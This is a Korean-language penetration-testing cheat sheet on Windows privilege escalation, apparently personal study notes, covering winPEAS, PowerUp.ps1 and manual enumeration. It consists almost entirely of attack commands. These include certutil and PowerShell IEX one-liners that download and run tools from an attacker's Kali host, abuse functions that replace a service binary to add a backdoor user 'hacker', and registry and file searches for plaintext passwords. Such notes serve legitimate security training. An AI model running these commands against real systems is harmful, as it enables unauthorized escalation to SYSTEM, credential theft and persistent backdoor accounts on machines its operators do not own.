# 01_winPEAS_자동화도구

# 윈도우 권한상승 — 자동화 도구

---

## winPEAS (가장 강력)

```bash
:: 다운로드
certutil -urlcache -split -f "http://<칼리IP>/winPEASx64.exe" C:\Temp\winPEAS.exe

:: 전체 실행
C:\Temp\winPEAS.exe

:: 조용히(배너 없음)
C:\Temp\winPEAS.exe quiet

:: 특정 섹션만
C:\Temp\winPEAS.exe systeminfo
C:\Temp\winPEAS.exe userinfo
C:\Temp\winPEAS.exe servicesinfo
C:\Temp\winPEAS.exe applicationsinfo

:: 결과 저장
C:\Temp\winPEAS.exe > C:\Temp\winpeas_out.txt
```

### 주요 확인 섹션

```
[+] AlwaysInstallElevated    → MSI로 SYSTEM
[+] Unquoted Service Paths   → 경로 공백 악용
[+] Modifiable Services      → 서비스 설정 변경
[+] Interesting Files        → 패스워드 파일
[+] PowerShell History       → 이전 명령어
[+] AutoLogon                → 평문 패스워드
[+] SeImpersonatePrivilege   → Potato 계열
```

---

## PowerUp.ps1

```powershell
:: 메모리 로드
powershell -ep bypass
IEX(New-Object Net.WebClient).DownloadString('http://<칼리IP>/PowerUp.ps1')

:: 전체 검사
Invoke-AllChecks
Invoke-PrivescAudit

:: 개별 함수
Get-ServiceUnquoted                    :: Unquoted Service Path
Get-ModifiableServiceFile              :: 서비스 바이너리 권한
Get-ModifiableService                  :: 서비스 설정 변경 권한
Get-RegistryAlwaysInstallElevated      :: AlwaysInstallElevated
Get-RegistryAutoLogon                  :: AutoLogon 평문 패스워드
Get-ModifiableRegistryAutoRun          :: AutoRun 바이너리 교체
Find-ProcessDLLHijack                  :: 프로세스 DLL hijack
Find-PathDLLHijack                     :: PATH DLL hijack

:: Abuse 함수 (즉시 익스플로잇)
Invoke-ServiceAbuse -Name 'vulnsvc'
Write-ServiceBinary -Name 'vulnsvc' -Command 'net user hacker P@ss123 /add'
Write-UserAddMSI
```

---

## 수동 열거 기본

```bash
whoami /priv         :: SeImpersonate, SeBackup 등 확인 ★
whoami /groups
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
net user
net localgroup administrators
wmic qfe get Caption,HotFixID,InstalledOn
tasklist /v
sc query type= all state= all
netstat -ano
reg query HKLM /f password /t REG_SZ /s
findstr /si password *.txt *.ini *.config *.xml
```